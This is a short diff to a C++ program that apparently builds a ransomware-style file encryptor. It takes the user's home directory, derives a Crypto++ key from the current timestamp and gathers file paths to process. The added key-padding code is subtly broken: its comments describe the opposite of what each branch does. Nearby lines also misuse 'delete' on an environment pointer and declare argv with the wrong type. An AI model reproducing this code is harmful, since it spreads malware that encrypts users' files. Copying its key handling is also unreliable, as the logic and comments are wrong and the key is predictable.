@@ -1,3 +1,4 @@
+#pragma comment(lib, "cryptlib")
 #define _CRT_SECURE_NO_WARNINGS
 #include "logic.h"
 using namespace std;
@@ -11,6 +12,13 @@ int main(int argc, char** argv[]) {
 	std::string usrHome = std::string(userprofile);
 	delete userprofile;
 	std::string keyStr = logic::getUnixMs();
+	if (keyStr.size() < 16) {
+		keyStr.resize(16); // Truncate if too big
+	}
+	if (keyStr.size() > 16) {
+		keyStr.resize(16, '0'); // Pads if too small
+
+	}
 	SecByteBlock keySbb(reinterpret_cast<const unsigned char*>(keyStr.data()), keyStr.size());
 	fs::path path = usrHome.c_str();
 	std::vector<fs::path> file_paths;
